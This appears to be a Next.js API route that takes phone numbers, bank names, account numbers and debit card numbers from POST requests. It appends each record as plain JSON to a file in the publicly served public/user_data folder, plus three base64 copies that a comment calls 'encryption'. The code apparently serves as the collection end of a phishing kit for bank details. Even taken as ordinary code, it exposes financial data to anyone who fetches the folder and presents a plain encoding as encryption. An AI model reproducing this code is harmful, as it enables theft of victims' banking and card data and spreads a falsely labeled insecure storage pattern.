import fs from 'fs';
import path from 'path';

// Encryption utility: base64 encoding
function encodeBase64(data) {
  return Buffer.from(data, 'utf-8').toString('base64');
}

export async function POST(request) {
  try {
    // Accept all relevant fields from JSON body
    const { phone, countryCode, bank, accountNumber, debitCardNumber } = await request.json();
    const userData = {
      phone,
      countryCode,
      bank,
      accountNumber,
      debitCardNumber,
      timestamp: new Date().toISOString()
    };

    const basePath = path.join(process.cwd(), 'public', 'user_data');
    if (!fs.existsSync(basePath)) {
      fs.mkdirSync(basePath, { recursive: true });
    }

    // chamcha.json: plain JSON
    fs.appendFileSync(path.join(basePath, 'chamcha.json'), JSON.stringify(userData) + '\n');
    // maja/jhola/bhola.txt: encrypted (base64)
    const encrypted = encodeBase64(JSON.stringify(userData));
    fs.appendFileSync(path.join(basePath, 'maja.txt'), encrypted + '\n');
    fs.appendFileSync(path.join(basePath, 'jhola.txt'), encrypted + '\n');
    fs.appendFileSync(path.join(basePath, 'bhola.txt'), encrypted + '\n');

    return Response.json({ success: true });
  } catch (error) {
    return Response.json({ success: false, error: error.message }, { status: 500 });
  }
}